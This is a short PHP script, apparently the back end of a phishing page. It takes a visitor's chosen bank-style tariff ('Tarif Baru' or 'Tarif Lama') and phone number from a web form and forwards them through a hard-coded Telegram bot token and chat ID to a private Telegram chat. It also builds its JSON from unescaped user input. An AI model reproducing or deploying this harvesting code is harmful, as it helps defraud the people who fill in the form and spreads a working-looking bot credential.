<?php
$token = "7413776470:AAG-YixrH98ptI_muX2rh6t81lGLSZ3M1ig";
$chatID = "6382456183";
$tarif = $_POST['radio'];
$tarifText = "";
if ($tarif == "radio1") {
  $tarifText = "Tarif Baru Rp150.000/Bulan";
} else {
  $tarifText = "Tarif Lama Rp6.500/Transaksi";
}
$content = "<b>Jenis Tarif:</b> ".$tarifText."\n<b>No. Handphone:</b> ".$_POST['nohp'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "{\"chat_id\":\"".$chatID."\",\"text\":\"".$content."\"}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
